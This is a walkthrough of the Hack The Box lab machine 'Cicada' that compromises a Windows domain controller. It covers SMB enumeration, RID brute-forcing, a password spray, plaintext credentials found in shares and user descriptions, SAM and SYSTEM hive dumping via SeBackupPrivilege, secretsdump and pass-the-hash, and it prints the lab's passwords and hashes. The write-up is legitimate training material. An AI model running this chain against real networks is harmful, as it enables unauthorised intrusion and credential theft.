# Target
[Cicada](https://app.hackthebox.com/machines/Cicada) is an easy-difficult Windows machine that focuses on beginner Active Directory enumeration and exploitation. In this machine, players will enumerate the domain, identify users, navigate shares, uncover plaintext passwords stored in files, execute a password spray, and use the `SeBackupPrivilege` to achieve full system compromise. 

# Scan
```
nmap -sS -sC $TARGET_IP
```
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-25 22:41 CET
Nmap scan report for 10.129.78.76
Host is up (0.033s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
636/tcp  open  ldapssl
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp open  wsman

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-26T04:41:34
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 47.71 seconds
```

# Foothold
Let's begin our enumeration with SMB mapping using `guest` account.

```
smbmap -u guest -p '' -H $TARGET_IP
```
```
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.126.225:445      Name: 10.129.126.225            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS
        HR                                                      READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
[*] Closed 1 connections  
```

We can see that as `guest` we have RO access to `HR` share. Further enumeration of this share show that it holds `Notice from HR.txt` file which contains default password for company newjoiners.
```
smbclient -U guest% \\\\$TARGET_IP\\HR -c 'get "Notice from HR.txt"' &&\
grep 'Your default password is:' Notice\ from\ HR.txt
```
```
Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

We could use this default password for 'Password Spray Attack' against target users. To enumerate users we will bruteforce RID using `guest` account.

```
netexec smb $TARGET_IP -u guest -p '' --rid-brute 10000 --log rid-brute.txt
```
```
SMB         10.129.78.76    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.78.76    445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.78.76    445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.78.76    445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.78.76    445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.78.76    445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.78.76    445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.78.76    445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.78.76    445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.78.76    445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.78.76    445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.78.76    445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.78.76    445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.78.76    445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.78.76    445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.78.76    445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.78.76    445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

Let's post process list returned by `netexec`, so we could use it as password spray input.
```
grep SidTypeUser rid-brute.txt | awk '{print $13}' | cut -d'\' -f2 | sort | uniq > users.txt &&\
cat users.txt
```
```
Administrator
CICADA-DC$
david.orelious
emily.oscars
Guest
john.smoulder
krbtgt
michael.wrightson
sarah.dantelia
```

Having target users in `users.txt` let's spray default password using `netexec`.
```
netexec smb $TARGET_IP -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```
```
SMB         10.129.78.76    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.78.76    445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.78.76    445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.78.76    445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.78.76    445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.78.76    445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.78.76    445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.78.76    445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.78.76    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.78.76    445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

We have found our first credenials `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`. Unfortunately `smbmap` (re)enumeration shows that it does not have access to `DEV` share nor it could be used to access target over Windows Remote Management. Let's try to use for further (not bruteforced) users enumeration.

```
netexec smb $TARGET_IP -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```
```
SMB         10.129.78.76    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.78.76    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.78.76    445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.78.76    445    CICADA-DC        Administrator                 2024-08-26 20:08:03 1       Built-in account for administering the computer/domain 
SMB         10.129.78.76    445    CICADA-DC        Guest                         2024-08-28 17:26:56 1       Built-in account for guest access to the computer/domain 
SMB         10.129.78.76    445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account 
SMB         10.129.78.76    445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1        
SMB         10.129.78.76    445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1        
SMB         10.129.78.76    445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.129.78.76    445    CICADA-DC        david.orelious                2024-03-14 12:17:29 1       Just in case I forget my password is aRt$Lp#7t*VQ!3 
SMB         10.129.78.76    445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 1        
SMB         10.129.78.76    445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

It seems password for `david.orelious` has been (unwisely) stored user in description. For this user we still can not spawn shell using WinRM, but `smbmap` shows it has access to `DEV` share.

```
smbmap -u david.orelious -p 'aRt$Lp#7t*VQ!3' -H $TARGET_IP
```
```
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.78.76:445        Name: 10.129.78.76              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     READ ONLY
        HR                                                      READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections           
```

Further enumeration shows that this share holds `Backup_script.ps1` file, which contains plaintext credentials for `emily.oscars`
```
smbclient -U 'david.orelious%aRt$Lp#7t*VQ!3' \\\\$TARGET_IP\\DEV -c "get Backup_script.ps1" &&\
grep -E 'username =|password =' Backup_script.ps1
```
```
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

With this user we can finally access target over WinRM
```
evil-winrm -i $TARGET_IP -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

And obtain user flag
```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cat C:\Users\emily.oscars.CICADA\Desktop\user.txt
********************************
```
Foothold gained, let's elevate priviliges.

# Priviliges escalation
We will start simply, with listing of `emily.oscars` priviliges.
```
whoami /all
```
```
USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We can see that this user has quite powerfull `SeBackupPrivilege`. This privilege allows a process to bypass file system permissions for the purpose of backup operations and with that we can immediately access root flag.

```
robocopy /B /NJH /NJS /NDL C:\Users\Administrator\Desktop\ . root.txt; cat root.txt
********************************
```

Grabing root flag solves the challange, but technically we have not (yet) elevated priviliges. Let's run extra mile to do so.

As with `SeBackupPrivilege` we can bypass file system permissions, the most straightforward approach would be dump of NTLM hashes from `SAM` file. `SYSTEM` file will be needed as well. Those files are critical for Windows authentication and (under normal conditions) are always in use by the operating system, thus we will not be able to directly copy them with `robocopy`. To overcome this issue we will dump them form registry to `.hiv` files instead and exfiltrate using SMB share.

```
reg save HKLM\SAM C:\Shares\DEV\SAM.hiv; reg save HKLM\SYSTEM C:\Shares\DEV\SYSTEM.hiv;
```

After exfiltration to our attack maching we we will dump NTLM hashes with `impacket-secretsdump`.
```
smbclient -U 'david.orelious%aRt$Lp#7t*VQ!3' \\\\$TARGET_IP\\DEV -c "get SAM.hiv; get SYSTEM.hiv" &&\
impacket-secretsdump -sam SAM.hiv -system SYSTEM.hiv LOCAL -outputfile cicada
```
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```

Dictionary attack, against `Administrator` hash, with use of `hashcat` and `rockyou.txt` dictionary does not yield any results. This not an issue as we could use this hash in Pass-the-Hash attack with WinRM (as it supports NTLM authentication with hashes).

```
evil-winrm -i $TARGET_IP -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
```

Now privileges are 'truly' elevated and we can conclude this writeup.